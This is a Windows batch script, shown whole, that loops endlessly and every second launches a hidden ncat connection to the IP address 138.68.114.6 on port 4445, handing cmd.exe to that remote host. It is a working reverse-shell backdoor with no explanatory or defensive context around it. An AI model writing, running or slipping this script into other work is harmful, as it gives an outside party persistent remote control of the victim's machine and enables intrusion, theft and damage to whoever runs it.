@echo off
:connect
start /B cmd /c ncat 138.68.114.6 4445 -e cmd.exe
timeout /t 1 /nobreak > nul
goto connect
